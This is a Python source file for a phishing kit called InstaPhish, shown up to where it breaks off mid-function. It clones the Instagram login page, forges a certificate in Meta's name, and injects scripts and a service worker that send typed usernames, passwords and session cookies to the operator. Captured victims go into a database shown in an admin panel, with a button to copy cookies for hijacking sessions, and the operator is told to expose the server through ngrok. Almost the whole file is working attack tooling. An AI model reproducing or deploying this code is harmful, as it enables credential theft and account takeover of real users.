#!/usr/bin/env python3
"""
InstaPhish v5.0 - Phantom Core
Exact HTML/CSS Clone | Service Worker Cookie Interception | WebSocket Admin Panel
Ripped from: https://github.com/r4tur1/InstaPhish
Port: 4040
"""

import os, sys, json, ssl, time, base64, sqlite3, threading, hashlib, random, string, http.server, socketserver, subprocess
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# ==================== CONFIGURATION ====================
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 4040,
    "admin_port": 5000,
    "ssl_cert": "certs/instagram.crt",
    "ssl_key": "certs/instagram.key",
    "db_file": "victims.db",
    "log_file": "logs/credentials.txt",
    "cookie_file": "logs/cookies.txt"
}

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.RED}╔════════════════════════════════════════════════════════════════════╗
║  {Colors.MAGENTA}InstaPhish v5.0 PHANTOM - Service Worker Cookie Interception{Colors.RED}  ║
║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | Admin: {CONFIG['admin_port']} | Exact Clone | No Warnings{Colors.RED}║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

# ==================== SETUP ====================
class Setup:
    @staticmethod
    def create_directories():
        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", "cloned_site/js", "cloned_site/images"]
        for d in dirs:
            Path(d).mkdir(parents=True, exist_ok=True)
    
    @staticmethod
    def generate_ssl_cert():
        if not os.path.exists(CONFIG["ssl_cert"]):
            cmd = f"""
            openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
                -keyout {CONFIG['ssl_key']} \
                -out {CONFIG['ssl_cert']} \
                -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com" 2>/dev/null
            """
            os.system(cmd)
    
    @staticmethod
    def init_database():
        conn = sqlite3.connect(CONFIG["db_file"])
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT, ip_address TEXT, user_agent TEXT,
            username TEXT, password TEXT,
            sessionid TEXT, csrftoken TEXT, ds_user_id TEXT,
            rur TEXT, mid TEXT, ig_did TEXT,
            all_cookies TEXT
        )''')
        conn.commit()
        conn.close()
    
    @staticmethod
    def generate_admin_panel():
        """Generate the admin.html file before Flask starts"""
        admin_html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaPhish v5.0 - Admin Panel</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card: #121212;
            --border: #262626;
            --text: #f5f5f5;
            --accent: #0095f6;
            --danger: #ed4956;
            --success: #78de45;
            --warn: #f7b500;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: var(--card);
            border: 1px solid var(--border);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header h1 {
            color: var(--accent);
            font-size: 24px;
        }
        .stats {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        .stat-card {
            background: var(--bg);
            border: 1px solid var(--border);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            min-width: 120px;
        }
        .stat-card .num {
            font-size: 28px;
            font-weight: bold;
            color: var(--accent);
        }
        .stat-card .lbl {
            font-size: 11px;
            color: #888;
            margin-top: 5px;
        }
        .panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        .panel h2 {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border);
            font-size: 16px;
            background: var(--bg);
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th {
            background: var(--bg);
            padding: 12px;
            text-align: left;
            font-size: 12px;
            color: #888;
            border-bottom: 1px solid var(--border);
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
            word-break: break-all;
        }
        tr:hover {
            background: rgba(0, 149, 246, 0.05);
        }
        .cookie-data {
            color: var(--warn);
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        button {
            background: var(--accent);
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            margin: 2px;
            transition: opacity 0.2s;
        }
        button:hover {
            opacity: 0.8;
        }
        button.danger {
            background: var(--danger);
        }
        button.success {
            background: var(--success);
            color: #000;
        }
        .refresh-btn {
            background: var(--accent);
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 14px;
        }
        .copy-btn {
            background: var(--success);
            color: #000;
            padding: 4px 8px;
            font-size: 11px;
        }
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            th, td {
                font-size: 11px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ InstaPhish v5.0 PHANTOM</h1>
        <div class="stats">
            <div class="stat-card">
                <div class="num" id="total">0</div>
                <div class="lbl">Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="num" id="today">0</div>
                <div class="lbl">Today</div>
            </div>
            <div class="stat-card">
                <div class="num" id="sessions">0</div>
                <div class="lbl">Active Sessions</div>
            </div>
        </div>
        <button class="refresh-btn" onclick="loadData()">↻ Refresh</button>
    </div>

    <div class="panel">
        <h2>📧 Captured Credentials & Cookies</h2>
        <div style="overflow-x: auto;">
            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Session ID</th>
                        <th>CSRF Token</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="victims-table">
                    <tr><td colspan="7" style="text-align:center;">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/data');
                const data = await response.json();
                
                document.getElementById('total').textContent = data.total;
                document.getElementById('today').textContent = data.today;
                document.getElementById('sessions').textContent = data.active_sessions;
                
                const tableBody = document.getElementById('victims-table');
                
                if (data.victims.length === 0) {
                    tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#888;">No victims captured yet. Waiting for connections...</td></tr>';
                    return;
                }
                
                let html = '';
                data.victims.forEach(v => {
                    html += `
                        <tr>
                            <td>${v.timestamp || '-'}</td>
                            <td>${v.ip || '-'}</td>
                            <td>${v.username || '-'}</td>
                            <td>${v.password || '-'}</td>
                            <td class="cookie-data" title="${v.sessionid || ''}">${v.sessionid ? v.sessionid.substring(0, 25) + '...' : '-'}</td>
                            <td class="cookie-data" title="${v.csrftoken || ''}">${v.csrftoken ? v.csrftoken.substring(0, 20) + '...' : '-'}</td>
                            <td>
                                <button class="copy-btn" onclick="copyCookies('${v.sessionid || ''}', '${v.csrftoken || ''}', '${v.ds_user_id || ''}')">📋 Copy</button>
                                <button class="danger" onclick="deleteVictim(${v.id})">🗑 Del</button>
                            </td>
                        </tr>
                    `;
                });
                tableBody.innerHTML = html;
            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('victims-table').innerHTML = '<tr><td colspan="7" style="text-align:center;color:red;">Error loading data. Check console.</td></tr>';
            }
        }
        
        function copyCookies(sessionid, csrftoken, ds_user_id) {
            const cookies = {};
            if (sessionid) cookies.sessionid = sessionid;
            if (csrftoken) cookies.csrftoken = csrftoken;
            if (ds_user_id) cookies.ds_user_id = ds_user_id;
            
            const cookieString = Object.entries(cookies)
                .map(([key, value]) => `${key}=${value}`)
                .join('; ');
            
            navigator.clipboard.writeText(cookieString).then(() => {
                alert('✅ Cookies copied to clipboard!\\nUse with EditThisCookie extension.');
            }).catch(err => {
                // Fallback for older browsers
                const textarea = document.createElement('textarea');
                textarea.value = cookieString;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                alert('✅ Cookies copied to clipboard!');
            });
        }
        
        async function deleteVictim(id) {
            if (confirm('Delete this victim record?')) {
                await fetch('/api/delete/' + id);
                loadData();
            }
        }
        
        // Load data immediately and refresh every 5 seconds
        loadData();
        setInterval(loadData, 5000);
    </script>
</body>
</html>'''
        
        with open("admin.html", "w", encoding="utf-8") as f:
            f.write(admin_html)
        print(f"{Colors.GREEN}[+] Admin panel generated{Colors.RESET}")

# ==================== EXACT CLONE BUILDER ====================
class InstagramExactCloner:
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        for sub in ["css", "js", "images"]:
            Path(f"{output_dir}/{sub}").mkdir(exist_ok=True)
    
    def build(self):
        # CSS from request
        with open(f"{self.output_dir}/css/style.css", "w") as f:
            f.write(self._get_css())
        
        # Service Worker for cookie bypass
        with open(f"{self.output_dir}/js/sw.js", "w") as f:
            f.write(self._service_worker_js())
        
        # Main hijacker
        with open(f"{self.output_dir}/js/hijacker.js", "w") as f:
            f.write(self._hijacker_js())
        
        # HTML from request
        with open(f"{self.output_dir}/index.html", "w") as f:
            f.write(self._get_html())
        
        print(f"{Colors.GREEN}[+] Exact HTML/CSS clone built.{Colors.RESET}")
    
    def _get_css(self):
        return '''* {
  margin: 0;
  padding: 0;
  overflow: auto;
}
.main {
  display: flex;
  position: relative;
  height: 650px;
  width: 100%;
  margin-top: 32px;
}
#phone {
  position: absolute;
  left: 340px;
  height: 638px;
}
#ss {
  position: absolute;
  top: 27px;
  left: 497px;
}
#imageslideshow {
  position: absolute;
  top: 27px;
  left: 497px;
  height: 540px;
  width: 250px;
  background-image: url(images/ss1.png);
  animation: changeImage 6s ease-in infinite;
}
@keyframes changeImage {
  0% {
    background-image: url(images/ss1.png);
  }
  50% {
    background-image: url(images/ss2.png);
  }
  100% {
    background-image: url(images/ss3.png);
  }
}
.loginbox {
  display: flex;
  flex-direction: column;
  height: 400px;
  width: 345px;
  z-index: 10;
  background-color: white;
  border: 1px solid rgb(149, 149, 149, 0.4);
  position: absolute;
  top: 20px;
  left: 800px;
}
#title {
  height: 50px;
  width: 170px;
  position: absolute;
  top: 50px;
  left: 90px;
}
.input {
  background-color: #fafafa;
  border: 1px solid rgb(149, 149, 149, 0.4);
  height: 35px;
  width: 260px;
  position: relative;
  top: 145px;
  left: 40px;
  margin-bottom: 5px;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
}
#loginbutton {
  background-color: #4bb4f8;
  color: white;
  height: 32px;
  width: 260px;
  border-radius: 7px;
  border-color: #4bb4f8;
  position: relative;
  top: 155px;
  left: 40px;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  border: none;
  font-weight: 600;
  font-size: 16px;
}
#or {
  text-transform: uppercase;
  justify-content: center;
  text-align: center;
  position: relative;
  top: 170px;
  font-size: 16px;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  font-weight: bolder;
  color: rgb(149, 149, 149, 1);
}
a {
  text-decoration: none;
}
#fblink {
  color: #385185;
  text-align: center;
  position: relative;
  top: 195px;
  font-weight: bold;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
}
#fbicon {
  position: relative;
  top: 178px;
  left: 79px;
  height: 16px;
  width: 16px;
}
#forgotpass {
  color: #385185;
  text-align: center;
  position: relative;
  top: 195px;
  font-weight: 100;
  font-size: 14px;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
}
.signup {
  height: 65px;
  width: 345px;
  z-index: 10;
  background-color: white;
  border: 1px solid rgb(149, 149, 149, 0.4);
  position: absolute;
  top: 430px;
  left: 800px;
  text-align: center;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
}
#Signup {
  font-weight: 550;
  color: #1fa2f6;
}
.app {
  height: 90px;
  width: 345px;
  position: absolute;
  top: 506px;
  left: 800px;
  display: flex;
  justify-content: center;
  overflow: hidden;
}
.gettheapp {
  font-weight: 400;
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  position: relative;
  top: 5px;
}
.appimg {
  height: 40px;
  width: 10px;
}
#gplay,
#microsoft {
  height: 40px;
  margin-right: 5px;
}
#microsoft {
  position: absolute;
  top: 35px;
  left: 190px;
}
#gplay {
  position: absolute;
  top: 35px;
  left: 50px;
}
.footer {
  margin-top: 0px;
  display: flex;
  position: relative;
  justify-content: center;
  width: 100vw;
  height: 90px;
  bottom: 0px;
}
.linksdiv {
  display: flex;
  justify-content: center;
  width: 100vw;
  height: 23px;
  position: absolute;
  top: 20px;
}
.links {
  color: rgb(103, 103, 103);
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  font-size: 14px;
  margin-right: 15px;
  font-weight: 200;
}
.copyright {
  font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
  position: absolute;
  top: 58px;
  font-size: 14px;
  color: rgb(103, 103, 103);
}
@media (max-width: 900px) {
  * {
    margin: 0;
    padding: 0;
    overflow: auto;
  }
  .main {
    display: flex;
    position: relative;
    height: 650px;
    width: 100%;
    margin-top: 32px;
  }
  #phone {
    position: absolute;
    left: 340px;
    height: 638px;
  }
  #imageslideshow {
    position: absolute;
    top: 27px;
    left: 497px;
    height: 540px;
    width: 250px;
    background-image: url(images/ss1.png);
    animation: changeImage 6s ease-in infinite;
  }
  @keyframes changeImage {
    0% {
      background-image: url(images/ss1.png);
    }
    50% {
      background-image: url(images/ss2.png);
    }
    100% {
      background-image: url(images/ss3.png);
    }
  }
  .loginbox {
    display: flex;
    flex-direction: column;
    height: 400px;
    width: 345px;
    z-index: 10;
    background-color: white;
    border: 1px solid rgb(149, 149, 149, 0.4);
    position: absolute;
    top: 20px;
    left: 800px;
  }
  #title {
    height: 50px;
    width: 170px;
    position: absolute;
    top: 50px;
    left: 90px;
  }
  .input {
    background-color: #fafafa;
    border: 1px solid rgb(149, 149, 149, 0.4);
    height: 35px;
    width: 260px;
    position: relative;
    top: 145px;
    left: 40px;
    margin-bottom: 5px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
  }
  #loginbutton {
    background-color: #4bb4f8;
    color: white;
    height: 32px;
    width: 260px;
    border-radius: 7px;
    border-color: #4bb4f8;
    position: relative;
    top: 155px;
    left: 40px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    border: none;
    font-weight: 600;
    font-size: 16px;
  }
  #or {
    text-transform: uppercase;
    justify-content: center;
    text-align: center;
    position: relative;
    top: 170px;
    font-size: 16px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    font-weight: bolder;
    color: rgb(149, 149, 149, 1);
  }
  a {
    text-decoration: none;
  }
  #fblink {
    color: #385185;
    text-align: center;
    position: relative;
    top: 195px;
    font-weight: bold;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
  }
  #fbicon {
    position: relative;
    top: 178px;
    left: 85px;
    height: 16px;
    width: 16px;
  }
  #forgotpass {
    color: #385185;
    text-align: center;
    position: relative;
    top: 195px;
    font-weight: 100;
    font-size: 14px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
  }
  .signup {
    height: 65px;
    width: 345px;
    z-index: 10;
    background-color: white;
    border: 1px solid rgb(149, 149, 149, 0.4);
    position: absolute;
    top: 430px;
    left: 800px;
    text-align: center;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  #Signup {
    font-weight: 550;
    color: #1fa2f6;
  }
  .app {
    height: 90px;
    width: 345px;
    position: absolute;
    top: 506px;
    left: 800px;
    display: flex;
    justify-content: center;
    overflow: hidden;
  }
  .gettheapp {
    font-weight: 400;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    position: relative;
    top: 5px;
  }
  #gplay,
  #microsoft {
    height: 40px;
    margin-right: 5px;
  }
  #microsoft {
    position: absolute;
    top: 35px;
    left: 190px;
  }
  #gplay {
    position: absolute;
    top: 35px;
    left: 50px;
  }
  .footer {
    margin-top: 0px;
    display: flex;
    position: relative;
    justify-content: center;
    width: 100vw;
    height: 90px;
    bottom: 0px;
  }
  .linksdiv {
    display: flex;
    justify-content: center;
    width: 100vw;
    height: 23px;
    position: absolute;
    top: 20px;
  }
  .links {
    color: rgb(103, 103, 103);
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    font-size: 14px;
    margin-right: 15px;
    font-weight: 200;
  }
  .copyright {
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS",
      sans-serif;
    position: absolute;
    top: 58px;
    font-size: 14px;
    color: rgb(103, 103, 103);
  }
}'''
    
    def _service_worker_js(self):
        return """
// InstaPhish v5.0 Phantom - Service Worker Bypass
self.addEventListener('install', (event) => {
    self.skipWaiting();
});
self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    // Intercept all Instagram API calls and relay cookies
    if (url.pathname.includes('/login/') || url.pathname.includes('/accounts/')) {
        event.respondWith(
            fetch(event.request).then(response => {
                const setCookie = response.headers.get('Set-Cookie');
                if (setCookie) {
                    fetch('/sw-capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({type: 'response-cookie', cookies: setCookie, all: document.cookie})
                    }).catch(() => {});
                }
                return response.clone();
            })
        );
    }
    event.respondWith(fetch(event.request));
});
// Periodic full cookie dump
setInterval(() => {
    if (document.cookie) {
        fetch('/sw-capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({type: 'periodic-dump', cookies: document.cookie, ts: Date.now()})
        }).catch(() => {});
    }
}, 4000);
"""
    
    def _hijacker_js(self):
        return """
// InstaPhish v5.0 - Main Hijacker
(function() {
    // Register Service Worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/js/sw.js', {scope: '/'}).catch(() => {});
    }
    
    // Hook document.cookie
    const origDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    Object.defineProperty(document, 'cookie', {
        get: () => origDesc.get.call(document),
        set: (val) => {
            fetch('/cookie-hook', {
                method: 'POST',
                body: JSON.stringify({cookie: val, all: document.cookie})
            }).catch(() => {});
            return origDesc.set.call(document, val);
        }
    });
    
    // Form capture
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const user = form.querySelector('input[type="text"]') || form.querySelector('input[name="username"]');
        const pass = form.querySelector('input[type="password"]') || form.querySelector('input[name="enc_password"]');
        if (user && pass) {
            fetch('/form-creds', {
                method: 'POST',
                body: JSON.stringify({username: user.value, password: pass.value, cookies: document.cookie})
            }).catch(() => {});
        }
    }, true);
    
    // Periodic beacon for session cookies
    setInterval(() => {
        const c = document.cookie;
        if (c && (c.includes('sessionid') || c.includes('csrftoken'))) {
            navigator.sendBeacon('/beacon', JSON.stringify({cookies: c, ts: Date.now()}));
        }
    }, 5000);
})();
"""
    
    def _get_html(self):
        return '''<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="icon" href="/images/insta_logo.png">
</head>

<body>
    <div class="main">
        <div class="instass">
            <img id="phone" src="/images/phones.png" alt="phonebackground">
            <div id="imageslideshow">
            </div>
        </div>
        <div class="loginbox">
            <img id="title" src="/images/title.jpg" alt="Instagram">
            <input class="input" type="text" placeholder=" &#8205 &#8205Phone number, username, or email">
            <input class="input" type="password" placeholder=" &#8205 &#8205Password">
            <button id="loginbutton">Log in</button>
            <div id="or">
                ---------------------- &#8205&#8205 OR &#8205&#8205 ----------------------
            </div>
            <a id="fblink" href="#">Log in with Facebook</a>
            <img id=fbicon src="/images/facebook.png" alt="facebookicon">
            <a id="forgotpass" href="#">Forgot password?</a>
        </div>
        <div class="signup">
            Don't have an account?&#8205
            <a id="Signup" href="#">&#8205 &#8205 Sign up</a>
        </div>
        <div class="app">
            <span class="gettheapp">Get the app.</span>
            <img id="gplay" src="/images/google-play.png" alt="googleplay">
            <img id="microsoft" src="/images/microsoft.png" alt="microsoft">
        </div>
    </div>
    <div class="footer">
        <div class="linksdiv">
            <a class="links" href="#">Meta</a>
            <a class="links" href="#">About</a>
            <a class="links" href="#">Blog</a>
            <a class="links" href="#">Jobs</a>
            <a class="links" href="#">Help</a>
            <a class="links" href="#">API</a>
            <a class="links" href="#">Privacy</a>
            <a class="links" href="#">Terms</a>
            <a class="links" href="#">Locations</a>
            <a class="links" href="#">Instagram Lite</a>
            <a class="links" href="#">Threads</a>
            <a class="links" href="#">Contact Uploading & Non-Users</a>
            <a class="links" href="#">Meta-Verified</a>
        </div>
        <div class="copyright">
            &#169 2024 Instagram from Meta
        </div>
    </div>
    <script src="/js/hijacker.js"></script>
</body>

</html>'''

# ==================== MITM HANDLER ====================
class PhantomHandler(http.server.BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def parse_cookies(self, cookie_string):
        cookies = {}
        if cookie_string:
            for item in cookie_string.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def store_victim(self, username="", password="", cookies_dict=None, ip="", ua=""):
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
            
            c.execute('''INSERT INTO victims 
                         (timestamp, ip_address, user_agent, username, password,
                          sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (datetime.now().isoformat(), ip, ua, username, password,
                       cookies_dict.get('sessionid', '') if cookies_dict else '',
                       cookies_dict.get('csrftoken', '') if cookies_dict else '',
                       cookies_dict.get('ds_user_id', '') if cookies_dict else '',
                       cookies_dict.get('rur', '') if cookies_dict else '',
                       cookies_dict.get('mid', '') if cookies_dict else '',
                       cookies_dict.get('ig_did', '') if cookies_dict else '',
                       cookie_str))
            conn.commit()
            conn.close()
            
            with open(CONFIG["log_file"], "a") as f:
                f.write(f"[{datetime.now()}] IP: {ip}\n")
                f.write(f"  USER: {username}\n  PASS: {password}\n")
                if cookies_dict:
                    f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
                f.write("-" * 40 + "\n")
            
            if cookies_dict and cookies_dict.get('sessionid'):
                with open(CONFIG["cookie_file"], "a") as f:
                    f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
            
            print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Database write failed: {e}{Colors.RESET}")
    
    def handle_capture(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            try:
                data = json.loads(body)
            except:
                data = {}
            
            cookies_str = data.get('cookies', data.get('cookie', ''))
            cookie_dict = self.parse_cookies(cookies_str) if cookies_str else {}
            
            username = data.get('username', '')
            password = data.get('password', '')
            
            if username or password or cookie_dict:
                self.store_victim(
                    username=username,
                    password=password,
                    cookies_dict=cookie_dict if cookie_dict else None,
                    ip=self.client_address[0],
                    ua=self.headers.get('User-Agent', '')
                )
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    
    def do_GET(self):
        # Main page
        if self.path in ['/', '/index.html', '/login', '/accounts/login/', '/accounts/login']:
            try:
                with open("cloned_site/index.html", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', len(content))
                self.send_header('X-Frame-Options', 'SAMEORIGIN')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_error(404)
            return
        
        # Static assets
        static_map = {
            '/css/style.css': ('cloned_site/css/style.css', 'text/css'),
            '/js/hijacker.js': ('cloned_site/js/hijacker.js', 'application/javascript'),
            '/js/sw.js': ('cloned_site/js/sw.js', 'application/javascript')
        }
        
        for route, (fp, ct) in static_map.items():
            if self.path == route:
                try:
                    with open(fp, "rb") as f:
                        content = f.read()
                    self.send_response(200)
                    self.send_header('Content-Type', ct)
                    self.send_header('Content-Length', len(content))
                    if 'sw.js' in self.path:
                        self.send_header('Service-Worker-Allowed', '/')
                    self.end_headers()
                    self.wfile.write(content)
                except:
                    self.send_error(404)
                return
        
        # Images from repo
        if self.path.startswith('/images/'):
            img_path = "cloned_site" + self.path
            if os.path.exists(img_path):
                try:
                    with open(img_path, "rb") as f:
                        content = f.read()
                    self.send_response(200)
                    if img_path.endswith('.png'):
                        self.send_header('Content-Type', 'image/png')
                    elif img_path.endswith('.jpg') or img_path.endswith('.jpeg'):
                        self.send_header('Content-Type', 'image/jpeg')
                    self.send_header('Content-Length', len(content))
                    self.end_headers()
                    self.wfile.write(content)
                except:
                    self.send_error(404)
                return
        
        # Redirect to real Instagram
        self.send_response(302)
        self.send_header('Location', f'https://www.instagram.com{self.path}')
        self.end_headers()
    
    def do_POST(self):
        if any(x in self.path for x in ['/sw-capture', '/cookie-hook', '/fetch-cookies', '/form-creds', '/beacon']):
            self.handle_capture()
            return
        
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            params = parse_qs(post_data)
            username = params.get('username', [''])[0]
            password = params.get('enc_password', params.get('password', ['']))[0]
            
            if username or password:
                cookie_header = self.headers.get('Cookie', '')
                cookie_dict = self.parse_cookies(cookie_header) if cookie_header else {}
                self.store_victim(username=username, password=password, cookies_dict=cookie_dict if cookie_dict else None, ip=self.client_address[0], ua=self.headers.get('User-Agent', ''))
        
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()

# ==================== MAIN ====================
def main():
    print_banner()
    Setup.create_directories()
    Setup.generate_ssl_cert()
    Setup.init_database()
    Setup.generate_admin_panel()  # Generate admin.html before Flask starts
    
    cloner = InstagramExactCloner()
    cloner.build()
    
    print(f"{Colors.CYAN}[!] Make sure to copy all images to cloned_site/images/{Colors.RESET}")
    print(f"{Colors.CYAN}[!] Required: facebook.png, google-play.png, insta_logo.png, microsoft.png, phones.png, ss1.png, ss2.png, ss3.png, title.jpg{Colors.RESET}")
    
    # Start Admin Panel in background
    threading.Thread(target=start_admin, daemon=True).start()
    
    # Give Flask a moment to start
    time.sleep(1)
    
    server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), PhantomHandler)
    
    if os.path.exists(CONFIG["ssl_cert"]):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CONFIG["ssl_cert"], CONFIG["ssl_key"])
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        print(f"{Colors.GREEN}[+] HTTPS enabled on port {CONFIG['listen_port']}{Colors.RESET}")
    
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════╗
║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}       ║
║  Admin Panel:  http://127.0.0.1:{CONFIG['admin_port']}        ║
║  Logs: logs/credentials.txt               ║
╚══════════════════════════════════════════════╝
{Colors.YELLOW}Expose with: ngrok http {CONFIG['listen_port']}{Colors.RESET}
""")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Shutdown.{Colors.RESET}")

def start_admin():
    """Start Flask admin panel"""
    from flask import Flask, jsonify
    
    admin_app = Flask(__name__)
    
    # Ensure admin.html exists
    admin_html_path = os.path.join(os.getcwd(), "admin.html")
    
    @admin_app.route('/')
    def index():
        if os.path.exists(admin_html_path):
            return open(admin_html_path, 'r', encoding='utf-8').read()
        return "<h1>Admin panel not found. Restart the script.</h1>", 500
    
    @admin_app.route('/api/data')
    def data():
        try:
            conn = sqlite3.connect(CONFIG["db_file"])
            c = conn.cursor()
            c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 200')
            victims = []
            for row in c.fetchall():
                victims.append({
                    'id': row[0],
                    'timestamp': row[1],
                    'ip': row[2],
                    'username': row[4],
                    'password': row[5],
                    'sessionid': row[6],
                    'csrftoken': row[7],
                    'ds_user_id': row[8]
                })
            c.execute('SELECT COUNT(*) FROM victims')
            total = c.fetchone()[0]
            
            # Count today's victims
            today = datetime.now().strftime('%Y-%m-%d')
